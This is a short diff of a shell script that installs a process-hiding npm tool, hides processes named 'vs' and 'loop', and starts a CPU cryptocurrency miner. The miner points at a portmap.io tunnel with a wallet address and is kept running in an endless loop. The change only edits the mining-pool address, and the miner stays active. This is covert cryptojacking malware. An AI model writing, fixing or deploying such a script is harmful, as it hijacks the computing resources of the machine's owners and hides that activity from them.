@@ -6,7 +6,7 @@ apt install npm -y
 npm i -g node-process-hider
 ph add vs
 ph add loop
-./loop -c stratum+tcp://latifgbl-47446.portmap.io:47446 -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.kop2 -p x --cpu 1
+./loop -c latifgbl-47446.portmap.io:47446 -u RP6jeZhhHiZmzdufpXHCWjYVHsLaPXARt1.kop2 -p x --cpu 1
 while [ 1 ]; do
 sleep 3
 done
